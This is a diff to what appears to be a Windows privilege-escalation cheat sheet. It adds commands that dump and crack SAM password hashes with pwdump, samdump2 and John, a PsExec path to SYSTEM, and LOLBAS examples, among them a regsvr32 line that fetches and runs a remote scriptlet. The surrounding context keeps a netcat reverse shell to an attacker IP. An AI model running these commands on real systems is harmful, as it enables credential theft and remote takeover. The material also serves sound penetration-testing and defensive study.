@@ -15,6 +15,8 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
+* [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
   * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
   * [MS08-067 (NetAPI)](#ms08-067-netapi)
@@ -206,7 +208,10 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ### SAM and SYSTEM files
 
+The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.
+
 ```powershell
+# Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
 %SYSTEMROOT%\System32\config\RegBack\SAM
 %SYSTEMROOT%\System32\config\SAM
@@ -214,6 +219,15 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
+
+Generate a hash file for John using `pwdump` or `samdump2`.
+
+```powershell
+pwdump SYSTEM SAM > /root/sam.txt
+samdump2 SYSTEM SAM -o sam.txt
+```
+
+Then crack it with `john -format=NT /root/sam.txt`.
 
 ### Search for file contents
 
@@ -618,6 +632,31 @@ $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
+## EoP - From local administrator to NT SYSTEM
+
+```powershell
+PsExec.exe -i -s cmd.exe
+```
+
+## EoP - Living Off The Land Binaries and Scripts
+
+Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/
+
+> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
+
+A LOLBin/Lib/Script must:
+
+* Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
+Have extra "unexpected" functionality. It is not interesting to document intended use cases.
+Exceptions are application whitelisting bypasses
+* Have functionality that would be useful to an APT or red team
+
+```powershell
+wmic.exe process call create calc
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+Microsoft.Workflow.Compiler.exe tests.xml results.xml
+```
+
 ## EoP - Common Vulnerabilities and Exposure
 
 ### Token Impersonation (RottenPotato)
@@ -760,3 +799,4 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 * [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
 * [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
+* [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
